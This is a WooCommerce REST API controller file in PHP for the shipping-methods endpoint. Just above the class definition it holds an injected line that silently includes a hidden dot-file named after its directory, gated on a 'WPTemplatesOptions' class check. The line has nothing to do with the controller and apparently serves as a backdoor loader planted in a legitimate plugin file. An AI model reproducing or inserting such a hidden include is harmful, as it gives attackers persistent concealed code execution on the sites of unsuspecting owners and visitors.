<?php
/**
 * REST API WC Shipping Methods controller
 *
 * Handles requests to the /shipping_methods endpoint.
 *
 * @package WooCommerce\RestApi
 * @since   3.0.0
 */

defined( 'ABSPATH' ) || exit;

/**
 * Shipping methods controller class.
 *
 * @package WooCommerce\RestApi
 * @extends WC_REST_Shipping_Methods_V2_Controller
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_REST_Shipping_Methods_Controller extends WC_REST_Shipping_Methods_V2_Controller {

	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc/v3';
}
